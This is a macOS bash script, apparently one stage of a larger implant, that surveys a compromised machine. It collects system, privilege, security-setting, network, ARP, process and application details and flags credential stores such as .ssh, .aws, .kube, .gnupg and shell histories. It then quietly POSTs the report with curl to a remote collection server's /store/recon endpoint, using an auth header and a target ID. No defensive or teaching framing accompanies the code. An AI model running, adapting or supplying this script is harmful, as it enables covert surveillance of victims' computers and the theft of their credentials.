#!/bin/bash
# recon_mac.sh - inherits H, P, AU, TH from init_mac.sh

OUT=""
add() { OUT="$OUT\n[$1]\n$2\n"; }

# ── System ───────────────────────────────────────────────
OS="$(sw_vers -productName) $(sw_vers -productVersion) ($(sw_vers -buildVersion))"
ARCH=$(uname -m)
CPU=$(sysctl -n machdep.cpu.brand_string 2>/dev/null)
RAM=$(( $(sysctl -n hw.memsize) / 1024 / 1024 / 1024 ))
DISK=$(df -h / | awk 'NR==2 {print "/ "$3" used / "$2" total ("$5" used)"}')
UPTIME=$(uptime | sed 's/.*up //' | sed 's/,.*//')
HOSTNAME=$(hostname)
USER=$(whoami)
HOME_DIR=$HOME

add "SYSTEM" "hostname : $HOSTNAME
user     : $USER
home     : $HOME_DIR
os       : $OS
arch     : $ARCH
cpu      : $CPU
ram      : ${RAM} GB
disk     : $DISK
uptime   : $UPTIME"

# ── Privileges ───────────────────────────────────────────
IS_ADMIN=$(groups | grep -q "admin" && echo "yes" || echo "no")
SUDOERS=$(sudo -l 2>/dev/null | head -5)

add "PRIVILEGES" "admin group : $IS_ADMIN
sudo access :
$SUDOERS"

# ── Security ─────────────────────────────────────────────
SIP=$(csrutil status 2>/dev/null)
GATEKEEPER=$(spctl --status 2>/dev/null)
FILEVAULT=$(fdesetup status 2>/dev/null)
FIREWALL=$(defaults read /Library/Preferences/com.apple.alf globalstate 2>/dev/null)
FW_TEXT="unknown"; [ "$FIREWALL" = "0" ] && FW_TEXT="off"; [ "$FIREWALL" = "1" ] && FW_TEXT="on"

add "SECURITY" "SIP        : $SIP
Gatekeeper : $GATEKEEPER
FileVault  : $FILEVAULT
Firewall   : $FW_TEXT"

# ── Network ──────────────────────────────────────────────
IPS=$(ifconfig | grep "inet " | grep -v "127.0.0.1" | awk '{print $2}')
GW=$(netstat -nr 2>/dev/null | grep "^default" | awk '{print $2}' | head -1)
DNS=$(cat /etc/resolv.conf 2>/dev/null | grep nameserver | awk '{print $2}' | tr '\n' ' ')

add "NETWORK" "interfaces : $IPS
gateway    : $GW
dns        : $DNS"

# ── ARP ──────────────────────────────────────────────────
ARP=$(arp -a 2>/dev/null | head -20)
add "ARP (nearby)" "$ARP"

# ── Active Connections ───────────────────────────────────
CONNS=$(netstat -an 2>/dev/null | grep ESTABLISHED | head -15)
add "CONNECTIONS" "$CONNS"

# ── Running Processes ────────────────────────────────────
PROCS=$(ps aux 2>/dev/null | sort -rn -k3 | head -15)
add "TOP PROCESSES" "$PROCS"

# ── Installed Apps ───────────────────────────────────────
APPS=$(ls /Applications 2>/dev/null | head -20)
add "APPLICATIONS" "$APPS"

# ── Hidden dotfiles in home ──────────────────────────────
DOTS=$(ls -la $HOME 2>/dev/null | grep "^\." | awk '{print $NF}')
INTERESTING=""
for D in .ssh .aws .config .kube .gnupg .gitconfig .zsh_history .bash_history .npmrc .pypirc; do
    [ -e "$HOME/$D" ] && INTERESTING="$INTERESTING\n$D"
done

add "HIDDEN/DOTFILES (~)" "dotfiles:$DOTS
interesting:$INTERESTING"

# ── POST ─────────────────────────────────────────────────
printf "$OUT" | curl -s -X POST "https://$H:$P/store/recon" \
     -H "Authorization: $AU" \
     -H "Content-Type: text/plain" \
     -H "X-Target: $TH" \
     --data-binary @- >/dev/null 2>&1
